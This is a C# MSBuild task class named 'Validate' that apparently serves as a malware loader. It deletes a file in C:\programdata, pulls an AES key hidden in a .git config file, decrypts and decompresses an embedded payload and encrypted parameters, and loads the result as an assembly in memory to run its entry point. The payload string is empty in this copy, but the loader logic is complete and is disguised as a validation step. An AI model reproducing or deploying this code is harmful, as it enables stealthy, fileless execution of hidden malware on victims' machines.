using System;
using System.Reflection;
using Microsoft.CSharp;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;

public class Validate : Task, ITask
{
    public override bool Execute()
    {
        File.Delete(@"C:\programdata\Update.xml");

        byte[] decryptedData;
        byte[] decryptedParams;
        using (var aes = new RijndaelManaged())
        {
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.Zeros;

            var lines = File.ReadAllLines(@"C:\programdata\git\org-database\.git\config");
            string encodedKey = string.Empty;
            foreach (var line in lines)
            {
                if (line.TrimStart('\t').StartsWith("key"))
                {
                    string[] delimiters = {" = "};
                    encodedKey = line.Split(delimiters, 2, StringSplitOptions.None)[1];
                    break;
                }
            }

            var key = Convert.FromBase64String(encodedKey);

            string data = @"";
            var decodedData = Convert.FromBase64String(data);

            var iv = new byte[16];
            Array.Copy(decodedData, iv, 16);
            var encryptedCode = new byte[decodedData.Length - iv.Length];
            Array.Copy(decodedData, iv.Length, encryptedCode, 0, encryptedCode.Length);

            using (ICryptoTransform decryptor = aes.CreateDecryptor(key, iv))
            using (var memoryStream = new MemoryStream(encryptedCode))
            {
                using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    var dataLengthBytes = new byte[sizeof(Int32)];
                    cryptoStream.Read(dataLengthBytes, 0, dataLengthBytes.Length);
                    var dataLength = BitConverter.ToInt32(dataLengthBytes, 0);

                    using (GZipStream decompressionStream = new GZipStream(cryptoStream, CompressionMode.Decompress))
                    {
                        using (var binaryReader = new BinaryReader(decompressionStream))
                        {
                            decryptedData = binaryReader.ReadBytes(dataLength);
                        }
                    }
                }
            }

            string parameters = @"1eA9q6dnaSctS5LwKFFOjCmgC4JyMhUOuib0y0Gc5pOHQ9//Qx2rXWC/b5wtcl1wvSsCgheC3AGYO7XXrwHS3YKkWQQ3LUloB/ZRzElgTQNxckaijDdQ4quDZCbscp2r9QQZxgiP9APXnklAGHtWrItVixt1AHgAk9xB50n/JmEQ6D0OpRrpd4r+GddusYOt";
            var decodedParams = Convert.FromBase64String(parameters);

            Array.Copy(decodedParams, iv, 16);
            var encryptedParams = new byte[decodedParams.Length - iv.Length];
            Array.Copy(decodedParams, iv.Length, encryptedParams, 0, encryptedParams.Length);

            using (ICryptoTransform decryptor = aes.CreateDecryptor(key, iv))
            using (var memoryStream = new MemoryStream(encryptedParams))
            {
                using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    var paramsLengthBytes = new byte[sizeof(Int32)];
                    cryptoStream.Read(paramsLengthBytes, 0, paramsLengthBytes.Length);
                    var paramsLength = BitConverter.ToInt32(paramsLengthBytes, 0);

                    using (var binaryReader = new BinaryReader(cryptoStream))
                    {
                        decryptedParams = binaryReader.ReadBytes(paramsLength);
                    }
                }
            }
        }

        var assembly = Assembly.Load(decryptedData);
        var runtimeConfig = new object[] { new string[] { Convert.ToBase64String(decryptedParams) } };
        assembly.EntryPoint.Invoke(null, runtimeConfig);

        return true;
    }
}
